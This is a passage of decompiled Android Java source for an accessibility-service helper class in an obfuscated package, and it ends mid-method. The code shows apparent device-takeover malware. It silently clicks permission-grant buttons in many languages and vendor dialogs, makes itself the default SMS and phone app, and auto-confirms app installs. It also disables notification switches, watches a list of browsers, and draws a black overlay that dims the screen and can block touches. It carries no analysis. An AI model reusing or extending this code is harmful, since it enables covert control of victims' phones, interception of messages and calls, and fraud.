/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.accessibilityservice.AccessibilityService$GestureResultCallback
 *  android.accessibilityservice.GestureDescription
 *  android.accessibilityservice.GestureDescription$Builder
 *  android.accessibilityservice.GestureDescription$StrokeDescription
 *  android.app.KeyguardManager
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.Intent
 *  android.graphics.Bitmap
 *  android.graphics.Bitmap$CompressFormat
 *  android.graphics.Bitmap$Config
 *  android.graphics.Canvas
 *  android.graphics.Color
 *  android.graphics.Paint
 *  android.graphics.Paint$Align
 *  android.graphics.Paint$Style
 *  android.graphics.Path
 *  android.graphics.Point
 *  android.graphics.PorterDuff$Mode
 *  android.graphics.Rect
 *  android.graphics.Typeface
 *  android.media.AudioManager
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Environment
 *  android.os.Handler
 *  android.os.Looper
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.provider.Settings
 *  android.provider.Settings$System
 *  android.util.Log
 *  android.view.Display
 *  android.view.SurfaceView
 *  android.view.View
 *  android.view.ViewGroup$LayoutParams
 *  android.view.WindowManager
 *  android.view.WindowManager$LayoutParams
 *  android.view.accessibility.AccessibilityEvent
 *  android.view.accessibility.AccessibilityManager
 *  android.view.accessibility.AccessibilityNodeInfo
 *  android.view.inputmethod.InputMethodManager
 */
package linker.resourcer.encoder;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.KeyguardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.Point;
import android.graphics.PorterDuff;
import android.graphics.Rect;
import android.graphics.Typeface;
import android.media.AudioManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.Display;
import android.view.SurfaceView;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.inputmethod.InputMethodManager;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Collectors;
import linker.resourcer.encoder.IncomingCallActivity;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda10;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda11;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda12;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda13;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda14;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda15;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda16;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda17;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda18;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda19;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda20;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda21;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda22;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda23;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda24;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda25;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda26;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda27;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda28;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda29;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda3;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda30;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda31;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda32;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda33;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda4;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda5;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda6;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda7;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda8;
import linker.resourcer.encoder.AccessibilityServiceHelper$$ExternalSyntheticLambda9;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.AccessibilityServiceController;
import linker.resourcer.encoder.WorkerService;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.SharedPreferencesManager;
import linker.resourcer.encoder.WakeLockActivity;

public class AccessibilityServiceHelper {
    static final boolean $assertionsDisabled = false;
    private static final Map<String, Supported_Browsers> BROWSERS_BY_PACKAGE;
    public static ArrayList<String> Blocked_Apps;
    public static ArrayList<String> Lock_App_list;
    public static Map<String, String> Map_Name_ID;
    public static Map<String, String> Map_Name_Lnk;
    public static Map<String, String> Map_Name_type;
    private static final List<Supported_Browsers> SUPPORTED_BROWSERS;
    public static List<String> TNames;
    public static ArrayList<String> TempPassLock;
    public static ArrayList<String> ject_list;
    private static int savedBrightness;
    private static int savedBrightnessMode;
    private static PowerManager.WakeLock wakelights;

    static {
        TempPassLock = new ArrayList();
        Blocked_Apps = new ArrayList();
        Lock_App_list = new ArrayList();
        ject_list = new ArrayList();
        SUPPORTED_BROWSERS = Arrays.asList(new Supported_Browsers(ConfigurationConstants.CHROME_PACKAGE, ConfigurationConstants.CHROME_ID), new Supported_Browsers(ConfigurationConstants.FIREFOX_PACKAGE, ConfigurationConstants.FIREFOX_ID), new Supported_Browsers(ConfigurationConstants.SAMSUNG_BROWSER_PACKAGE, ConfigurationConstants.SAMSUNG_BROWSER_ID), new Supported_Browsers(ConfigurationConstants.BRAVE_PACKAGE, ConfigurationConstants.BRAVE_ID), new Supported_Browsers(ConfigurationConstants.OPERA_PACKAGE, ConfigurationConstants.OPERA_ID), new Supported_Browsers(ConfigurationConstants.DUCKDUCKGO_PACKAGE, ConfigurationConstants.DUCKDUCKGO_ID), new Supported_Browsers(ConfigurationConstants.OPERA_MINI_PACKAGE, ConfigurationConstants.OPERA_MINI_ID), new Supported_Browsers(ConfigurationConstants.MICROSOFT_EDGE_PACKAGE, ConfigurationConstants.MICROSOFT_EDGE_ID), new Supported_Browsers(ConfigurationConstants.COLOROS_BROWSER_PACKAGE, ConfigurationConstants.COLOROS_BROWSER_ID), new Supported_Browsers(ConfigurationConstants.ANDROID_BROWSER_PACKAGE, ConfigurationConstants.ANDROID_BROWSER_ID), new Supported_Browsers(ConfigurationConstants.TUNNY_BROWSER_PACKAGE, ConfigurationConstants.TUNNY_BROWSER_ID));
        BROWSERS_BY_PACKAGE = SUPPORTED_BROWSERS.stream().collect(Collectors.toMap(new AccessibilityServiceHelper$$ExternalSyntheticLambda16(), new AccessibilityServiceHelper$$ExternalSyntheticLambda17()));
        wakelights = null;
        savedBrightness = -1;
        savedBrightnessMode = -1;
        TNames = new ArrayList<String>();
        Map_Name_Lnk = new HashMap<String, String>();
        Map_Name_ID = new HashMap<String, String>();
        Map_Name_type = new HashMap<String, String>();
    }

    public static void AddID(String string2, String string3) {
        if (!Map_Name_ID.containsKey(string2)) {
            Map_Name_ID.put(string2, string3);
        }
    }

    public static void AddTname(String string2) {
        if (!TNames.contains(string2)) {
            TNames.add(string2);
        }
    }

    public static void AddType(String string2, String string3) {
        if (!Map_Name_type.containsKey(string2)) {
            Map_Name_type.put(string2, string3);
        }
    }

    public static void Addlink(String string2, String string3) {
        if (!Map_Name_Lnk.containsKey(string2)) {
            Map_Name_Lnk.put(string2, string3);
        }
    }

    public static void BlackScreen(boolean bl) {
        Context context = AccessibilityServiceHelper.mycontext();
        boolean bl2 = true;
        if (context != null) {
            bl2 = SharedPreferencesManager.ReadBool(context, ConfigurationConstants.BlackScreen_BlockTouches, true);
        }
        AccessibilityServiceHelper.BlackScreen(bl, bl2);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static void BlackScreen(boolean bl, boolean bl2) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        Context context = AccessibilityServiceHelper.mycontext();
        if (context == null) {
            return;
        }
        try {
            Handler handler = new Handler(jhvbzpdwpbqgticwdxuva2.getMainLooper());
            if (bl) {
                SharedPreferencesManager.WriteBool(context, ConfigurationConstants.BlackScreen_BlockTouches, bl2);
                AccessibilityServiceController.BlackScreen_BlockTouches = bl2;
                AccessibilityServiceHelper.dimBrightness(context);
                AccessibilityServiceHelper$$ExternalSyntheticLambda4 AccessibilityServiceHelper$$ExternalSyntheticLambda4 = new AccessibilityServiceHelper$$ExternalSyntheticLambda4(jhvbzpdwpbqgticwdxuva2, context);
                handler.post((Runnable)AccessibilityServiceHelper$$ExternalSyntheticLambda4);
                return;
            }
            AccessibilityServiceHelper.restoreBrightness(context);
            AccessibilityServiceHelper$$ExternalSyntheticLambda5 AccessibilityServiceHelper$$ExternalSyntheticLambda5 = new AccessibilityServiceHelper$$ExternalSyntheticLambda5(jhvbzpdwpbqgticwdxuva2);
            handler.post((Runnable)AccessibilityServiceHelper$$ExternalSyntheticLambda5);
            return;
        }
        catch (Exception exception) {
            exception.printStackTrace();
        }
    }

    public static void BringMeFront(Context context) {
        if (AccessibilityServiceHelper.myAccess() != null) {
            AccessibilityServiceHelper.Treger("IncomingCallActivity", null);
        } else {
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable(context){
                final Context val$ctx;
                {
                    this.val$ctx = context;
                }

                @Override
                public void run() {
                    try {
                        AccessibilityServiceHelper.addOverlay(this.val$ctx);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                    try {
                        Intent intent = new Intent(this.val$ctx, IncomingCallActivity.class);
                        intent.addFlags(0x10000000);
                        intent.addFlags(0x20000000);
                        intent.addFlags(0x4000000);
                        intent.addFlags(524288);
                        this.val$ctx.startActivity(intent);
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                    }
                }
            }, 1L);
        }
    }

    public static boolean CLickTextpostion(String string2, AccessibilityNodeInfo accessibilityNodeInfo) {
        if (accessibilityNodeInfo != null && accessibilityNodeInfo.getChildCount() != 0) {
            for (int i = 0; i < accessibilityNodeInfo.getChildCount(); ++i) {
                AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo.getChild(i);
                if (accessibilityNodeInfo2 == null) continue;
                if (accessibilityNodeInfo2.getText() != null && ((Object)accessibilityNodeInfo2.getText()).toString().toLowerCase().equals(string2.toLowerCase())) {
                    string2 = new Rect();
                    accessibilityNodeInfo2.getBoundsInScreen((Rect)string2);
                    AccessibilityServiceHelper.clickthis(((Rect)string2).left, string2.centerY());
                    return true;
                }
                if (AccessibilityServiceHelper.CLickTextpostion(string2, accessibilityNodeInfo2)) {
                    return true;
                }
                accessibilityNodeInfo2.recycle();
            }
            return false;
        }
        return false;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void ClickDefaltcalls(int n, String string2) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block11: {
            jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 == null) {
                return;
            }
            if (n > 4) {
                AndroidLogger.Debug("ClickDefalt", "Did not find target button");
                AccessibilityServiceController.SET_CALLS_DEF = false;
                AccessibilityServiceController.onedefult = false;
                return;
            }
            AccessibilityNodeInfo accessibilityNodeInfo = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
            if (accessibilityNodeInfo != null) {
                int n2;
                String[] stringArray;
                try {
                    AccessibilityServiceHelper.clickAllText(string2, accessibilityNodeInfo, jhvbzpdwpbqgticwdxuva2.getApplicationContext());
                    stringArray = new String[]{"com.android.settings:id/left_button", "android:id/button1", "com.android.packageinstaller:id/permission_allow_always_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_button", "com.android.packageinstaller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.packageinstaller:id/permission_allow_button", "android:id/button1", "com.samsung.android.packageinstaller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.huawei.systemmanager:id/btn_allow", "com.huawei.packageinstaller:id/permission_allow_button", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "com.miui.securitycenter:id/accept", "miui:id/grant", "miui:id/button2", "miui:id/action_positive"};
                    n2 = stringArray.length;
                }
                catch (Exception exception) {
                    // empty catch block
                    break block11;
                }
                block5: for (int i = 0; i < n2; ++i) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(stringArray[i])) {
                        try {
                            accessibilityNodeInfo2.performAction(16);
                            accessibilityNodeInfo2.recycle();
                            continue block5;
                        }
                        catch (Exception exception) {
                        }
                    }
                }
            }
        }
        if (UtilityHelper.isDefaultDialer(jhvbzpdwpbqgticwdxuva2.getApplicationContext())) {
            AccessibilityServiceController.SET_CALLS_DEF = false;
            AccessibilityServiceController.onedefult = false;
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda14(n, string2), 3000L);
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private static void ClickDefaltsms(int n, String string2) {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2;
        block11: {
            jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
            if (jhvbzpdwpbqgticwdxuva2 == null) {
                return;
            }
            if (n > 3) {
                AndroidLogger.Debug("ClickDefalt", "Did not find target button");
                AccessibilityServiceController.SET_SMS_DEF = false;
                AccessibilityServiceController.onedefult = false;
                return;
            }
            AccessibilityNodeInfo accessibilityNodeInfo = jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow();
            if (accessibilityNodeInfo != null) {
                int n2;
                String[] stringArray;
                try {
                    AccessibilityServiceHelper.clickAllText(string2, accessibilityNodeInfo, jhvbzpdwpbqgticwdxuva2.getApplicationContext());
                    stringArray = new String[]{"com.android.settings:id/left_button", "android:id/button1", "com.android.packageinstaller:id/permission_allow_always_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_button", "com.android.packageinstaller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.packageinstaller:id/permission_allow_button", "android:id/button1", "com.samsung.android.packageinstaller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.huawei.systemmanager:id/btn_allow", "com.huawei.packageinstaller:id/permission_allow_button", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "com.miui.securitycenter:id/accept", "miui:id/grant", "miui:id/button2", "miui:id/action_positive"};
                    n2 = stringArray.length;
                }
                catch (Exception exception) {
                    // empty catch block
                    break block11;
                }
                block5: for (int i = 0; i < n2; ++i) {
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(stringArray[i])) {
                        try {
                            if (!accessibilityNodeInfo2.isEnabled() || !accessibilityNodeInfo2.isClickable()) continue;
                            accessibilityNodeInfo2.performAction(16);
                            accessibilityNodeInfo2.recycle();
                            continue block5;
                        }
                        catch (Exception exception) {
                        }
                    }
                }
            }
        }
        if (UtilityHelper.isDefaultSms(jhvbzpdwpbqgticwdxuva2.getApplicationContext())) {
            AccessibilityServiceController.SET_SMS_DEF = false;
            AccessibilityServiceController.onedefult = false;
            return;
        }
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda21(n, string2), 3000L);
    }

    /*
     * Unable to fully structure code
     */
    private static void ClickInstall(int var0) {
        block6: {
            if (var0 <= 3) ** GOTO lbl7
            AndroidLogger.Debug("ClickInstall", "Did not find install button");
            AccessibilityServiceController.oneinstall = false;
            AccessibilityServiceController.AUTO_INSTALL = false;
            return;
lbl7:
            // 1 sources

            var1_1 = AccessibilityServiceHelper.myAccess();
            if (var1_1 != null) break block6;
            return;
        }
        var1_1 = AccessibilityServiceHelper.getNodeByViewId(var1_1.getRootInActiveWindow(), "android:id/button1");
        if (var1_1 == null) ** GOTO lbl-1000
        try {
            if (var1_1.isVisibleToUser() && var1_1.isClickable()) {
                var1_1.performAction(16);
            } else lbl-1000:
            // 2 sources

            {
                var1_1 = new Handler(Looper.getMainLooper());
                var2_3 = new AccessibilityServiceHelper$$ExternalSyntheticLambda8(var0);
                var1_1.postDelayed(var2_3, 1000L);
            }
        }
        catch (Exception var1_2) {
            // empty catch block
        }
    }

    public static void Clickallow(AccessibilityNodeInfo object, AccessibilityNodeInfo object2) {
        int n;
        int n2;
        Object object3;
        String[] stringArray;
        AccessibilityNodeInfo accessibilityNodeInfo;
        if (AccessibilityServiceHelper.myAccess() == null) {
            return;
        }
        Context context = AccessibilityServiceHelper.mycontext();
        if (context == null) {
            return;
        }
        if (AccessibilityServiceController.SET_SMS_DEF) {
            try {
                if (AccessibilityServiceController.onedefult) {
                    return;
                }
                AccessibilityServiceController.onedefult = true;
                accessibilityNodeInfo = UtilityHelper.getLabelApplication(context);
                stringArray = new Handler(Looper.getMainLooper());
                object3 = new AccessibilityServiceHelper$$ExternalSyntheticLambda0((String)accessibilityNodeInfo);
                stringArray.postDelayed((Runnable)object3, 1000L);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (AccessibilityServiceController.SET_CALLS_DEF) {
            try {
                if (AccessibilityServiceController.onedefult) {
                    return;
                }
                AccessibilityServiceController.onedefult = true;
                stringArray = UtilityHelper.getLabelApplication(context);
                accessibilityNodeInfo = new Handler(Looper.getMainLooper());
                object3 = new AccessibilityServiceHelper$$ExternalSyntheticLambda11((String)stringArray);
                accessibilityNodeInfo.postDelayed((Runnable)object3, 1000L);
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (AccessibilityServiceController.FOR_Dream) {
            try {
                object3 = UtilityHelper.getLabelApplication(context);
                object2 = new Handler(Looper.getMainLooper());
                accessibilityNodeInfo = new AccessibilityServiceHelper$$ExternalSyntheticLambda22((String)object3, (AccessibilityNodeInfo)object);
                object2.postDelayed((Runnable)accessibilityNodeInfo, 500L);
            }
            catch (Exception exception) {
                // empty catch block
            }
            return;
        }
        if (AccessibilityServiceController.AUTO_INSTALL) {
            if (object != null) {
                if (AccessibilityServiceController.oneinstall) {
                    return;
                }
                AccessibilityServiceController.oneinstall = true;
                AccessibilityServiceController.AUTO_INSTALL = false;
                new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda27(), 3000L);
            }
            return;
        }
        if (AccessibilityServiceController.FOR_PLY && object != null) {
            if (UtilityHelper.isAppDisabled(context, "com.android.vending")) {
                AccessibilityServiceController.FOR_PLY = false;
                return;
            }
            if (AccessibilityServiceController.onedisply) {
                return;
            }
            AccessibilityServiceController.onedisply = true;
            AccessibilityServiceHelper.disply(context);
        }
        if (AccessibilityServiceController.FOR_EXTR_STRG) {
            if (object != null) {
                if (Build.VERSION.SDK_INT >= 30 && Environment.isExternalStorageManager()) {
                    AccessibilityServiceController.FOR_EXTR_STRG = false;
                    return;
                }
                if (object.getPackageName() != null && ((Object)object.getPackageName()).toString().toLowerCase().contains("settings")) {
                    if (AccessibilityServiceController.oneExtstrg) {
                        return;
                    }
                    AccessibilityServiceController.oneExtstrg = true;
                    new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda28(), 800L);
                }
            }
            return;
        }
        if (AccessibilityServiceController.FOR_DRAW_OVER) {
            try {
                if (!Settings.canDrawOverlays((Context)context)) {
                    if (AccessibilityServiceController.onetimeDraw) {
                        return;
                    }
                    AccessibilityServiceController.onetimeDraw = true;
                    accessibilityNodeInfo = new Handler(Looper.getMainLooper());
                    object3 = new AccessibilityServiceHelper$$ExternalSyntheticLambda29(context);
                    accessibilityNodeInfo.postDelayed((Runnable)object3, 1500L);
                    return;
                }
                AccessibilityServiceController.FOR_DRAW_OVER = false;
            }
            catch (Exception exception) {
                AndroidLogger.Error("FOR_DRAW_OVER", exception.getMessage());
            }
        }
        if (AccessibilityServiceController.FOR_NOTFY) {
            try {
                if (AccessibilityServiceController.onetimeNoty) {
                    return;
                }
                AccessibilityServiceController.onetimeNoty = true;
                object2 = new Handler(Looper.getMainLooper());
                object = new AccessibilityServiceHelper$$ExternalSyntheticLambda30();
                object2.postDelayed((Runnable)object, 1000L);
            }
            catch (Exception exception) {
                // empty catch block
            }
            return;
        }
        if (object != null) {
            accessibilityNodeInfo = AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)object);
            stringArray = new String[]{"com.android.permissioncontroller:id/permission_allow_button", "com.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.android.permissioncontroller:id/permission_allow_always_button", "com.android.permissioncontroller:id/permission_allow_one_time_button", "com.google.android.permissioncontroller:id/permission_allow_button", "com.google.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.google.android.permissioncontroller:id/permission_allow_always_button", "com.google.android.permissioncontroller:id/permission_allow_one_time_button", "com.android.packageinstaller:id/permission_allow_button", "com.android.packageinstaller:id/permission_allow_always_button", "com.android.packageinstaller:id/permission_allow_foreground_only_button", "com.samsung.android.permissioncontroller:id/permission_allow_button", "com.samsung.android.permissioncontroller:id/permission_allow_foreground_only_button", "com.samsung.android.packageinstaller:id/permission_allow_button", "com.huawei.systemmanager:id/btn_allow", "com.huawei.packageinstaller:id/permission_allow_button", "com.lbe.security.miui:id/permission_allow_foreground_only_button", "com.lbe.security.miui:id/permission_allow_button", "com.miui.securitycenter:id/accept", "miui:id/grant", "miui:id/button2", "miui:id/action_positive", "com.android.settings:id/left_button", "android:id/button1", "com.google.android.permissioncontroller:id/permission_allow_selected_button", "com.android.permissioncontroller:id/permission_allow_selected_button", "com.google.android.permissioncontroller:id/grant_dialog_button_allow", "com.android.permissioncontroller:id/grant_dialog_button_allow"};
            int n3 = stringArray.length;
            n2 = 0;
            for (int i = 0; i < n3; ++i) {
                object3 = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(stringArray[i]).iterator();
                while (true) {
                    n = n2;
                    if (!object3.hasNext()) break;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo)object3.next();
                    try {
                        accessibilityNodeInfo2.performAction(16);
                        AccessibilityServiceController.forbattery = false;
                        ConfigurationConstants.removeapp = false;
                        accessibilityNodeInfo2.recycle();
                        n = 1;
                    }
                    catch (Exception exception) {
                        continue;
                    }
                    break;
                }
                if (n != 0) {
                    n2 = n;
                    break;
                }
                n2 = n;
            }
            if (n2 != 0) {
                accessibilityNodeInfo.recycle();
                return;
            }
        }
        if (object2 != null) {
            stringArray = new String[]{"Allow", "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c", "\u0414\u043e\u0437\u0432\u043e\u043b\u0438\u0442\u0438", "Autoriser", "Erlauben", "Permitir", "Consenti", "\u5141\u8bb8", "\ud5c8\uc6a9", "\u8a31\u53ef", "\u0627\u0644\u0633\u0645\u0627\u062d", "\u0130zin ver", "Zulassen", "Till\u00e5t", "Toestaan"};
            n = stringArray.length;
            object3 = null;
            for (n2 = 0; n2 < n; ++n2) {
                accessibilityNodeInfo = stringArray[n2];
                try {
                    accessibilityNodeInfo = AccessibilityServiceHelper.findNodesByText((String)accessibilityNodeInfo, (AccessibilityNodeInfo)object2);
                    object3 = accessibilityNodeInfo;
                }
                catch (Exception exception) {
                    // empty catch block
                }
                if (object3 == null) continue;
                try {
                    if (object3.isEmpty()) continue;
                    object3 = object3.get(0);
                    object3.performAction(16);
                    ConfigurationConstants.removeapp = false;
                    AccessibilityServiceController.forbattery = false;
                    object3.recycle();
                    break;
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                    break;
                }
            }
        }
        if (object2 != null) {
            object2 = object2.findAccessibilityNodeInfosByViewId("com.miui.securitycenter:id/accept").iterator();
            while (object2.hasNext()) {
                ((AccessibilityNodeInfo)object2.next()).performAction(16);
            }
        }
        if (object != null) {
            try {
                object2 = AccessibilityNodeInfo.obtain((AccessibilityNodeInfo)object);
                object = Arrays.asList("Allow", "While using the app", "Only this time", "\u0420\u0430\u0437\u0440\u0435\u0448\u0438\u0442\u044c", "\u041f\u0440\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0438 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f", "\u0422\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0438", "\u041e\u0434\u043d\u043e\u043a\u0440\u0430\u0442\u043d\u043e", "\u0414\u043e\u0437\u0432\u043e\u043b\u0438\u0442\u0438", "\u041f\u0456\u0434 \u0447\u0430\u0441 \u0432\u0438\u043a\u043e\u0440\u0438\u0441\u0442\u0430\u043d\u043d\u044f", "\u672c\u6b21", "Once", "\u59cb\u7ec8", "kali", "l\u1ea7n", "\u0627\u0644\u0633\u0645\u0627\u062d", "izinkan", "Ch\u1ea5p nh\u1eadn", "Permitir", "Permitir solo mientras se usa la aplicaci\u00f3n", "Permitir apenas enquanto estiver usando o aplicativo", "Autoriser", "Pendant l'utilisation", "Erlauben", "Bei Nutzung der App", "\u0130zin ver", "\u1001\u103d\u1004\u1037\u103a\u1015\u103c\u102f\u1015\u102b", "\u1010\u1005\u103a\u1000\u103c\u102d\u1019\u103a", "\u0f50\u0f7a\u0f44\u0f66\u0f0b\u0f60\u0f51\u0f72\u0f62\u0f0b\u0f60\u0f41\u0f7c\u0f62\u0f0b\u0f66\u0f90\u0fb1\u0f7c\u0f51\u0f0b\u0f56\u0fb1\u0f7a\u0f51\u0f0b\u0f46\u0f7c\u0f42", "\u0f51\u0f0b\u0f51\u0f7a\u0f0b\u0f46\u0f7c\u0f42").iterator();
                while (object.hasNext()) {
                    object3 = object2.findAccessibilityNodeInfosByText((String)object.next());
                    if (object3.isEmpty()) continue;
                    if ((object3 = (AccessibilityNodeInfo)object3.get(0)).isClickable()) {
                        object3.performAction(16);
                        ConfigurationConstants.removeapp = false;
                        AccessibilityServiceController.forbattery = false;
                        break;
                    }
                    object3.recycle();
                }
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
        if (AccessibilityServiceController.forbattery) {
            if (UtilityHelper.IsIgnore_Battery(context)) {
                AccessibilityServiceController.forbattery = false;
                return;
            }
            if (AccessibilityServiceController.onebtry) {
                return;
            }
            AccessibilityServiceController.onebtry = true;
            new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda31(context), 800L);
        }
    }

    private static void DisabelNotifi() {
        AccessibilityServiceController jhvbzpdwpbqgticwdxuva2 = AccessibilityServiceHelper.myAccess();
        if (jhvbzpdwpbqgticwdxuva2 == null) {
            return;
        }
        block0: for (String string2 : new String[]{"android.widget.CheckBox", "android.widget.Switch", "android.view.View"}) {
            List<AccessibilityNodeInfo> list = AccessibilityServiceHelper.getNodesByClassName(jhvbzpdwpbqgticwdxuva2.getRootInActiveWindow(), string2);
            if (list == null || list.size() <= 0) continue;
            Rect rect = list.iterator();
            while (rect.hasNext()) {
                AccessibilityNodeInfo accessibilityNodeInfo = rect.next();
                if (!accessibilityNodeInfo.isCheckable() || !accessibilityNodeInfo.isChecked()) continue;
                if (accessibilityNodeInfo.isClickable()) {
                    accessibilityNodeInfo.performAction(16);
                    continue block0;
                }
                rect = new Rect();
                accessibilityNodeInfo.getBoundsInScreen(rect);
                AccessibilityServiceHelper.clickthis((int)rect.exactCenterX(), (int)rect.exactCenterY());
                continue block0;
            }
        }
        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new AccessibilityServiceHelper$$ExternalSyntheticLambda6(jhvbzpdwpbqgticwdxuva2), 100L);
        AccessibilityServiceController.FOR_NOTFY = false;
    }

    private static void EnableDraw(Context context, boolean bl) {
        AccessibilityNodeInfo accessibilityNodeInfo;
        Object object;
